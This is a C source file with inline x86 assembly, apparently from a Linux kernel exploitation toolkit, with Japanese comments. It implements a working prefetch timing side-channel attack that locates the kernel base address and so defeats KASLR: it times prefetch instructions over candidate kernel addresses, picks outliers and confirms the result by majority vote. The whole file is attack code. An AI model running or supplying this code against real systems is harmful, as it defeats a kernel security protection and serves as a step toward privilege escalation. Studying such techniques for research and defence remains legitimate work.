#include <stdint.h>
#include <stdio.h>

#include "util.h"

static uint64_t measure_prefetch_time(const uint64_t addr) {
    uint64_t ret;
    asm volatile(
        ".intel_syntax noprefix;"
        "rdtsc;"
        "mov r8, rdx;"
        "shl r8, 32;"
        "or r8, rax;"
        "lfence;"
        "prefetchnta [%1];"
        "prefetcht2 [%1];"
        "lfence;"
        "rdtsc;"
        "shl rdx, 32;"
        "or rax, rdx;"
        "sub rax, r8;"
        "mov %0, rax;"
        ".att_syntax;"
        : "=r"(ret)
        : "r"(addr)
        : "rax", "rdx", "r8", "memory");
    return ret;
}

static uint64_t find_outlier_index(const uint64_t *times, uint64_t count) {
    if (count == 0) {
        return 0;
    }

    double mean = 0.0;
    for (uint64_t i = 0; i < count; i++) {
        mean += (double)times[i];
    }
    mean /= count;

    double max_diff = -1.0;
    uint64_t outlier_idx = 0;
    for (uint64_t i = 0; i < count; i++) {
        const double diff = FABS((double)times[i] - mean);
        if (diff > max_diff) {
            max_diff = diff;
            outlier_idx = i;
        }
    }
    return outlier_idx;
}

uint64_t prefetch_kbase() {
    puts("[ ] finding kbase by prefetch side-channel attack");
    uint64_t num_trials = 10;
    const uint64_t num_vote = 10;
    const uint64_t start = 0xffffffff81000000;
    const uint64_t end = 0xffffffffc0000000;
    const uint64_t step = 0x40000;

    const uint64_t num_steps = (end - start) / step;

    // 攻撃を num_trials 回繰り返す
    while (num_trials--) {
        uint64_t cand_addr[num_vote];
        uint64_t min_time[num_steps];
        // num_vote 回 prefetch side-channel 攻撃を行う
        for (uint64_t vote = 0; vote < num_vote; vote++) {
            for (uint64_t i = 0; i < num_steps; i++) {
                min_time[i] = UINT64_MAX;
            }
            // base address 候補を 16 回ずつ prefetch してみる
            uint64_t num_prefetch = 16;
            while (num_prefetch--) {
                for (uint64_t i = 0; i < num_steps; i++) {
                    const uint64_t time = measure_prefetch_time(start + step * i);
                    min_time[i] = MIN(time, min_time[i]);
                }
            }
            // 最も平均から離れているアドレスに投票
            const uint64_t outlier_index = find_outlier_index(min_time, num_steps);
            cand_addr[vote] = (start + step * outlier_index) & ~0xfffff;
        }
        // 集めた候補に対して、過半数の投票があったかを確認する
        for (uint64_t i = 0; i < num_vote; i++) {
            const uint64_t addr = cand_addr[i];
            uint64_t count = 0;
            for (uint64_t j = 0; j < num_vote; j++) {
                if (addr == cand_addr[j]) {
                    count++;
                }
            }
            if (count > num_vote / 2) {
                printf("[+] found kbase by prefetch side-channel attack");
                printf("[+] kbase = %#lx\n", addr);
                return addr;
            }
        }
    }
    puts("[-] unable to detect kbase by prefetch side-channel attack");
    return 0;
}
